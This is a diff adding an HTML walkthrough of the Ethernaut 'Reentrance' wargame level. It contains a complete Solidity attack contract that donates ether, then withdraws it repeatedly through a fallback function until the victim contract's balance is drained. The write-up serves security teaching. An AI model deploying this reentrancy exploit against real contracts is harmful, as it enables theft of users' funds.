@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 10: Reentrance</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 10: Reentrance</h1>
+
+        
+      </div>
+      
+        
+        <p>This contract should be deployed with an ether value that
+divides the <code>Reentrance</code> contract’s balance without remainder.
+Ethernaut deploys <code>Reentrance</code> with 1 ether.</p>
+
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./10_Reentrance.sol&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ReentranceAttack</span> </span>{
+    Reentrance instance;
+    <span class="hljs-keyword">uint</span> withdrawAmount;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> instanceAddr</span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        instance = Reentrance(instanceAddr);
+    }</pre></div>
+      
+        
+        <p>In order to call <code>withdraw</code> repeatedly before anything is subtracted from
+our balance, we are required to have a non-zero balance to begin with.</p>
+
+        <div class='highlight'><pre>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">drainVictim</span> (<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        withdrawAmount = <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
+        instance.donate.<span class="hljs-built_in">value</span>(withdrawAmount)(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>));
+        instance.withdraw(withdrawAmount);
+    }</pre></div>
+      
+        
+        <p>When <code>Reentrance</code> sends us back our ‘donation’, this contract’s <code>fallback</code>
+function is executed and can issue <code>withdraw</code> to send us more ether before our
+balance is updated.</p>
+
+        <div class='highlight'><pre>    <span class="hljs-function"><span class="hljs-keyword">fallback</span> (<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(instance).<span class="hljs-built_in">balance</span> &gt; <span class="hljs-number">0</span>) {
+            instance.withdraw(withdrawAmount);
+        }
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
